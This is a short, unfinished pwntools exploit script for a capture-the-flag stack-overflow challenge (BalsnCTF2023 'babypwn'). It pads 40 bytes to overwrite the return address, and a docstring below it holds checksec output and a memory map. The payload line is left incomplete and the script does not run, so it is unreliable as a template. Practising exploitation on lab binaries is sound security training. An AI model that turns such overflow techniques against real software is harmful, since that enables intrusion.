from pwn import *

io = process('./chall')
io = gdb.debug('./chall', 'start')
context.binary = './chall'


offset = 40
payload = b'A' * offset
payload += 
io.sendline(b'A' * offset + b'')

io.interactive()


"""                                                                                    0x7f3c13f84500
[*] '/workspaces/ctf-problems/BalsnCTF2023/pwnable/babypwn/chall'               │      0x7f3c13f01000     0x7f3c13f04000     0x3000        0x0  rw-p   
    Arch:     amd64-64-little                                                   │      0x7f3c13f04000     0x7f3c13f2c000    0x28000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
    RELRO:    Full RELRO                                                        │      0x7f3c13f2c000     0x7f3c140c1000   0x195000    0x28000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6
    Stack:    No canary found                                                   │      0x7f3c140c1000     0x7f3c14119000    0x58000   0x1bd000  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
[+] Starting local process './chall': pid 3387                                  │      0x7f3c14119000     0x7f3c1411d000     0x4000   0x214000  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
[+] Starting local process '/usr/bin/gdbserver': pid 3389                       │      0x7f3c1411d000     0x7f3c1411f000     0x2000   0x218000  rw-p   /usr/lib/x86_64-linux-gnu/libc.so.6
"""